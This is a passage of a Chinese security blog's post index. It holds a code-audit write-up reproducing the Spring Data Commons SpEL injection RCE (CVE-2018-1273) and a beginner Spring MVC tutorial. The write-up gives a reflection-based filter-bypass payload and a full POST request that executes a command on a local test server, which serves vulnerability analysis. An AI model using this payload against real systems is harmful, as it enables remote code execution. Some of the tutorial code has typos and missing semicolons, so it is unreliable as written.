+<p>最后通过调用expression.setValue()对SpEL表达式进行解析</p>
+<p>![image-20220406135804188](代码审计之Spring Data Commons RCE&#x2F;image-20220406135804188.png)</p>
+<p>从上面我们可以知道想要执行任意SpEL表达式的话，首先就要知道isWritableProperty()方法是如何对参数进行校验的并且绕过器校验即可。</p>
+<p>继续跟进isWritableProperty()，可以看到关键代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public boolean isWritableProperty(String propertyName) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                return this.getPropertyPath(propertyName) != null;</span><br><span class="line">            &#125; catch (PropertyReferenceException var3) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>当getPropertyPath()返回值不为NULL时，直接对其执行return操作。跟进getPropertyPath()查看其逻辑，关键代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private PropertyPath getPropertyPath(String propertyName) &#123;</span><br><span class="line">            String plainPropertyPath = propertyName.replaceAll(&quot;\\[.*?\\]&quot;, &quot;&quot;);</span><br><span class="line">            //正则匹配</span><br><span class="line">            return PropertyPath.from(plainPropertyPath, this.type);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先将正则匹配的字符.?*\进行 替换为空 ，并判断剩下的内容是否为type的属性。这里的type则是在Controller处用到的用于接收参数的类。</p>
+<p>所以只需要利用这个类的某个字段来构造恶意的SpEL表达式，但直接使用如下payload是没有用的:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(&#x27;calc.exe&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>由于在某些版本中添加了用来拒绝SpEL表达式的关键语句，所以需要使用反射来构造payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&#x27;calc.exe&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>成功构造pyload后便可寻找漏洞触发点，并对其进行测试，经过搜索可发现ProxyingHandlerMethodArgumentResolver.java中实例化了MapDataBinder对象，并调用了bind方法，将request.getParameterMap()作为参数，从前端获取传递过来的key-value的map类型的值</p>
+<p>![image-20220406142447929](代码审计之Spring Data Commons RCE&#x2F;image-20220406142447929.png)</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>运行spring boot项目</p>
+<p>![image-20220406145730359](代码审计之Spring Data Commons RCE&#x2F;image-20220406145730359.png)</p>
+<p>浏览器访问locahost:8080&#x2F;users&#x2F;</p>
+<p>![image-20220406145855003](代码审计之Spring Data Commons RCE&#x2F;image-20220406145855003.png)</p>
+<p>输入payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username%5B%23this.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22calc.exe%22%29%5D=xxxxxxx</span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造数据请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: UM_distinctid=17d0947f1c862-0bbd9d1b4f56ea8-4c3e217e-1fa400-17d0947f1c9407; CNZZDATA1278069914=104780330-1636529643-%7C1636540572; __51uvsct__JGjrOr2rebvP6q2a=4; __51vcke__JGjrOr2rebvP6q2a=4c5322fc-092c-5527-b2a8-79802e8249c4; __51vuft__JGjrOr2rebvP6q2a=1636538257018</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 123</span><br><span class="line"></span><br><span class="line">username%5B%23this.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22calc.exe%22%29%5D=xxxxxxx</span><br></pre></td></tr></table></figure>
+
+
+
+<p>命令执行成功</p>
+<p>![image-20220406151302281](代码审计之Spring Data Commons RCE&#x2F;image-20220406151302281.png)</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://4ra1n.love/post/NeNCohaqp/">CVE-2018-1273分析 | 4ra1n</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/45501896">从CVE-2018-1273学漏洞分析 - 知乎 (zhihu.com)</a></p>
+<p><a href="https://cloud.tencent.com/developer/news/321462">从CVE-2018-1273学漏洞分析 - 云+社区 - 腾讯云 (tencent.com)</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>后门永久植入</title>
     <url>/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/</url>
     <content><![CDATA[<h1 id="后门永久植入"><a href="#后门永久植入" class="headerlink" title="后门永久植入"></a>后门永久植入</h1><hr>
@@ -4183,6 +4599,64 @@
       </categories>
       <tags>
         <tag>-渗透测试 -信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第一个Spring MVC项目</title>
+    <url>/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring%20MVC%E9%A1%B9%E7%9B%AE/</url>
+    <content><![CDATA[<h1 id="第一个Spring-MVC项目"><a href="#第一个Spring-MVC项目" class="headerlink" title="第一个Spring MVC项目"></a>第一个Spring MVC项目</h1><h2 id="项目创建"><a href="#项目创建" class="headerlink" title="项目创建"></a>项目创建</h2><p>首先在IDEA中新建项目选择Java进行新建</p>
+<p>![image-20220402152510269](第一个Spring MVC项目&#x2F;image-20220402152510269.png)</p>
+<p>创建项目成功</p>
+<p>![image-20220402152639568](第一个Spring MVC项目&#x2F;image-20220402152639568.png)</p>
+<h2 id="添加SpringMVC"><a href="#添加SpringMVC" class="headerlink" title="添加SpringMVC"></a>添加SpringMVC</h2><p>右键项目名称点击添加框架支持</p>
+<p>![image-20220402152828851](第一个Spring MVC项目&#x2F;image-20220402152828851.png)</p>
+<p>选择Spring MVC进行下载添加</p>
+<p>![image-20220402152930006](第一个Spring MVC项目&#x2F;image-20220402152930006.png)</p>
+<p>下载完成后发现项目下多了lib(存放依赖包)和web文件夹</p>
+<p>![image-20220402153227310](第一个Spring MVC项目&#x2F;image-20220402153227310.png)</p>
+<p>然后设置项目结构（Project Structure），选择**Artifacts&#x3D;&gt;Fix(在右下角)**添加依赖</p>
+<p>![image-20220402153530707](第一个Spring MVC项目&#x2F;image-20220402153530707.png)</p>
+<h2 id="添加Tomcat"><a href="#添加Tomcat" class="headerlink" title="添加Tomcat"></a>添加Tomcat</h2><p>点击右上角的Add Configuration，点击+号选择Tomcat Local</p>
+<p>![image-20220402160742627](第一个Spring MVC项目&#x2F;image-20220402160742627.png)</p>
+<p>配置Tomcat文件及其相关配置</p>
+<p>![image-20220402161031367](第一个Spring MVC项目&#x2F;image-20220402161031367.png)</p>
+<p>点击运行程序后通过浏览器访问默认页面，运行效果如下：</p>
+<p>![image-20220402161439032](第一个Spring MVC项目&#x2F;image-20220402161439032.png)</p>
+<h2 id="SpringMVC应用创建"><a href="#SpringMVC应用创建" class="headerlink" title="SpringMVC应用创建"></a>SpringMVC应用创建</h2><p>首先在src文件夹下新建包org.springmvc.helloworld和类TestController.java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.springmvc.helloworld;</span><br><span class="line">import org.springframework.stereotype.Controller</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping</span><br><span class="line"></span><br><span class="line">        @Controller</span><br><span class="line">public class TestController &#123;</span><br><span class="line">        @RequestMapping(&quot;/test&quot;)</span><br><span class="line">            public String helloworld()&#123;</span><br><span class="line">            return &quot;hello&quot;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>该代码通过RequestMapping对访问路径进行定义，这里以test对父目录进行定义，然后以Index对子目录进行定义，helloworld方法通过&#x2F;test&#x2F;index这个URL来访问helloworld.jsp这个文件</p>
+<p>接下来在jsp文件夹下创建hello.jsp文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: Administrator</span><br><span class="line">  Date: 2022/4/2</span><br><span class="line">  Time: 16:32</span><br><span class="line">  To change this template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Hello!!!!! Whale-fall</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行tomcat后，通过浏览器访问</p>
+<p>![image-20220402200121507](第一个Spring MVC项目&#x2F;image-20220402200121507.png)</p>
+<h2 id="SpringMVC-Model向view传值"><a href="#SpringMVC-Model向view传值" class="headerlink" title="SpringMVC Model向view传值"></a>SpringMVC Model向view传值</h2><p>上图已经成功创建了视图，接下来就是通过Model向view进行传值输出。</p>
+<p>这里需要引用org.springframework.ui.Model包对相关变量进行赋值，代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ackage com.springmvc.Controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">@Controller</span><br><span class="line">public class HelloWorldController &#123;</span><br><span class="line">    @RequestMapping(value=&quot;/test&quot;)</span><br><span class="line">    public String hello(Model model)&#123;</span><br><span class="line">        model.addAttribute(“name”,&quot;whale-fall&quot;)</span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>hello.jap文件修改如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; isELIgnored=&quot;false&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;hello&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;hello!!!!!$&#123;name&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行tomcat通过浏览器访问</p>
+<p>![image-20220402201015681](第一个Spring MVC项目&#x2F;image-20220402201015681.png)</p>
+<p>这里的输出和上面的一样，但不同的是通过变量值来传参输出的</p>
+<h2 id="SpringMVC获取URL参数值"><a href="#SpringMVC获取URL参数值" class="headerlink" title="SpringMVC获取URL参数值"></a>SpringMVC获取URL参数值</h2><p>我们知道如何对视图进行传值，那如果我们需要从URL中获取到参数来输出呢？只需要在定义方法时顺便写上需要的参数即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.springmvc.Controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">@Controller</span><br><span class="line">public class HelloWorldController &#123;</span><br><span class="line">    @RequestMapping(value=&quot;/test&quot;)</span><br><span class="line">    public String hello(String name,Model model)&#123;</span><br><span class="line">        model.addAttribute(&quot;name&quot;,&quot;whale-fall&quot;);</span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过浏览器 &#x2F;?name&#x3D;whale-fall进行传参</p>
+<p>![image-20220402203152029](第一个Spring MVC项目&#x2F;image-20220402203152029.png)</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/qq_36890370/article/details/113815490">(67条消息) IDEA2020 创建一个SpringMVC工程_逮仔的博客-CSDN博客_idea创建springmvc工程</a></p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+        <category>java</category>
+        <category>Spring</category>
+      </categories>
+      <tags>
+        <tag>-Java -Spring MVC -框架</tag>
       </tags>
   </entry>
   <entry>
